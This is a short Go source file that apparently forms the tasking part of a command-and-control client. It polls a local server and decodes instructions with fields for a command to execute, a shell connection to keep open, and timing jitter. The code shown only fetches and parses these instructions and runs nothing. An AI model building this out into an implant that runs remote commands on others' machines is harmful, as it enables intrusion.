package main

import (
	"encoding/json"
	"io"
	"net/http"
)

type Odin struct {
	KeepShellConnection bool
	ExecuteCommand      string
	Jitter              int64
}

func askOdin() Odin {
	resp, _ := http.Get("http://localhost:8080/serve")
	if resp == nil || resp.StatusCode != http.StatusOK {
		return Odin{}
	}
	body, _ := io.ReadAll(resp.Body)

	var odin Odin
	_ = json.Unmarshal(body, &odin)
	return odin
}
